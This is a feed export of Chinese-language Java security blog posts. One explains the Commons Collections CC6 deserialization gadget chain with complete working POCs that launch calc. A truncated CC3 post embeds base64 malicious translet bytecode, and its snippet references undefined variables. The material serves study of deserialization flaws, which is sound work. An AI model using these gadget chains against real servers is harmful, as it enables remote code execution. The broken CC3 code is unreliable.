        <content type="html"><![CDATA[<h1 id="为什么需要CC6"><a href="#为什么需要CC6" class="headerlink" title="为什么需要CC6"></a>为什么需要CC6</h1><p>因为这是 Shiro 会利用到的一条链子 可以说是 CC1 + lazymap 的一种重合，但是在 8U71之后，CC1不能用了，主要是sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了。</p><p>CC6 可以说是在CC库中 相对比较通用的利用链，这就是为什么 我CSDN 中也写了，并决定发在这的原因，在后续的Shiro 中 使用频率还是很高的，所以我决定再次深入了解其原理。为了解决高版本中 JAVA的利用问题，我们先来看看此链，继续贴上我的珍藏图：</p><p><img src="/2023/05/17/JAVA-CommonsCollections6/cc%E9%93%BE.jpg"></p><p>可以看到 CC6 是利用的 HashMap的链子，这里贴一下P神 简化的利用链代码;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Gadget chain: </span><br><span class="line">java.io.ObjectInputStream.readObject() </span><br><span class="line">java.util.HashMap.readObject() </span><br><span class="line">java.util.HashMap.hash() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.map.LazyMap.get() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() */</span><br></pre></td></tr></table></figure><p>这个链 主要是要看从最开始到 org.apache.commons.collections.map.LazyMap.get() 的那⼀部 分<br>简单来说，解决Java⾼版本利⽤问 题，实际上就是在找上下⽂中是否还有其他调⽤ LazyMap#get() 的地⽅。</p><p>找到的类是 是 org.apache.commons.collections.keyvalue.TiedMapEntry ，在其getValue⽅法 中调⽤了 this.map.get ，⽽其hashCode⽅法调⽤了getValue⽅法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123;  </span><br><span class="line">  </span><br><span class="line">private static final long serialVersionUID = -8453869361373831205L;  </span><br><span class="line"></span><br><span class="line">    public TiedMapEntry(Map map, Object key) &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        this.map = map;  </span><br><span class="line">        this.key = key;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   public Object getKey() &#123;  </span><br><span class="line">        return key;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public Object getValue() &#123;  </span><br><span class="line">        return map.get(key);  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">// ....</span><br><span class="line"></span><br><span class="line">public int hashCode() &#123; </span><br><span class="line">Object value = this.getValue(); </span><br><span class="line">return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125;</span><br></pre></td></tr></table></figure><p>如果这里的 map &#x3D; LazyMap 就会调用LazyMap#get 触发CC1利用链，欲触发LazyMap利⽤链，要找到就是哪⾥调⽤了 TiedMapEntry#hashCode 。</p><p>，在 java.util.HashMap#readObject 中就可以找到 HashMap#hash() 的调⽤，去掉了 最前⾯的两次调⽤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class HashMap extends AbstractMap implements Map, Cloneable, Serializable &#123;</span><br><span class="line">static final int hash(Object key) &#123; </span><br><span class="line">int h;</span><br><span class="line">return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream s) throws IOException,ClassNotFoundException &#123;</span><br><span class="line"> s.defaultReadObject(); // ... p for (int i = 0; i &lt; mappings; i++) &#123; </span><br><span class="line"> @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); </span><br><span class="line"> @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), </span><br><span class="line"> key, value, false, false); &#125; &#125; &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在HashMap的readObject⽅法中，调⽤到了 hash(key) ，⽽hash⽅法中，调⽤到了 key.hashCode() 。所以，我们只需要让这个key等于TiedMapEntry对象，即可连接上前⾯的分析过 程，构成⼀个完整的Gadget。</p><h1 id="逐步构造POC"><a href="#逐步构造POC" class="headerlink" title="逐步构造POC"></a>逐步构造POC</h1><p>然后尝试 自己构造一波这个 POC，再说说自己的踩坑过程，建议都自己构造一次，再来找问题，虽然 会有点长，但是你一步步自己构造一定会收获颇丰！ 以下是我个人的POC  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功弹出计算器~</p><p><img src="/2023/05/17/JAVA-CommonsCollections6/exec1.PNG"></p><p>但实际上 我们这个计算器弹的是不正确的，为了避免本地调试时触发命令执 ⾏我们可以加入 假 的Transformer数组进去，等最后要⽣成Payload的 时候，再生成一个 ChainedTransformer，调用其方法，再把真正的 transformers 替换进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        Class clazz = Class.forName(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;);  </span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;iTransformers&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(chainedTransformer,transformers);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，这下G了  连计算器都不弹了……..</p><h1 id="为什么没有弹出计算器？"><a href="#为什么没有弹出计算器？" class="headerlink" title="为什么没有弹出计算器？"></a>为什么没有弹出计算器？</h1><p>单步调试⼀下 ，会发现关键点在LazyMap的get⽅法 ，他没有进入这个if语句，得到的结果就是没有触发我们的命令 </p><p><img src="/2023/05/17/JAVA-CommonsCollections6/ec.jpG"></p><p>这是为什么呢?<br><code>_containsKey_方法——判断是否包含指定的键名</code>  </p><p>唯一出现 Ku1s - 1 的地方 就是在我们 new TiedMapEntry 的时候<br>但 TiedMapEntry 的构造函数并没有修改outerMap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//LazyMap构造部分  </span><br><span class="line">HashMap innerMap = new HashMap();  </span><br><span class="line">Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">//TiedMapEntry构造部分  </span><br><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);</span><br><span class="line"></span><br><span class="line">HashMap hashMap = new HashMap();  </span><br><span class="line">hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);</span><br></pre></td></tr></table></figure><p>其实关键点就在于 hashMap.put(tiedMapEntry,”Ku1s-2”); 语句</p><p>HashMap的put⽅法中，也有调⽤到 hash(key) ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123; </span><br><span class="line">return putVal(hash(key), key, value, false, true); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哈哈哈  这就相当于撞了个乌龙！~ 本来是想利用 readObject 中的 hash()去调用的，没曾想put方法也能够触发这个 hash ，也就是说提前把我们的代码执行了一遍，因为我前⾯⽤了 fakeTransformers ，所以此 时并没有触发命令执⾏，但实际上也对我们构造Payload产⽣了影响。</p><p>我们的解决⽅法也很简单，只需要将Ku1s-1这个Key，再从outerMap中移除即 可： outerMap.remove(“Ku1s-1”) 。</p><p>完整POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtime构造部分  </span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;  </span><br><span class="line">        Transformer[] exp = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformer构造部分  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMap构造部分  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMap类  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntry构造部分  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMap构造部分  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        outMap.remove(&quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        Class clazz = Class.forName(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;);  </span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;iTransformers&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(chainedTransformer,exp);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/17/JAVA-CommonsCollections6/poc.png"></p><p>希望对你有所帮助 ~</p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CommonsCollections3</title>
      <link href="/2023/05/16/JAVA-CommonsCollections3/"/>
      <url>/2023/05/16/JAVA-CommonsCollections3/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么需要CommonsCollections3"><a href="#为什么需要CommonsCollections3" class="headerlink" title="为什么需要CommonsCollections3"></a>为什么需要CommonsCollections3</h1><p>上篇文章 分析了 动态加载字节码的危害，如果有一个可控的http服务路径，则可能存在 恶意加载动态字节码，因此，我们很自然的会想到，如何更巧妙的利用他，所以 CC3 诞生了。</p><p>CC3 其实是 和 CC1 的结合  即 从原来的 InvokerTransformer 到 Runtime.class 到exec() 变成了 InvokerTransformer调用 TemplatesImpl#newTransformer()~</p><p>届时，我献出我珍藏已久的一张图：<br><img src="/2023/05/16/JAVA-CommonsCollections3/cc%E9%93%BE.jpg"></p><p>我们只需要将 CC1 和 CC3 两段POC 结合一下，即可很容易的改造出一个任意字节码的CC链，只需要把CC1中的 InvokerTransformer 的执行方法 改成 TemplatesImpl::newTransformer() 即可：</p><p>POC如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">package CommonsCollections3;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc3&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] bytes = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        //templates.newTransformer();</span><br><span class="line">        </span><br><span class="line">//cc1+cc3</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(templates),</span><br><span class="line">                new InvokerTransformer(&quot;newTransformer&quot;,null,null)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line"></span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/JAVA-CommonsCollections3/2.jpg"></p><p>但 这不是真正的 CC3 ，CC3的目的是为了绕过CC1的限制，也就是对InvokerTransformer的限制，有些 反序列化的过滤器的黑名单 就有了 InvokerTransformer 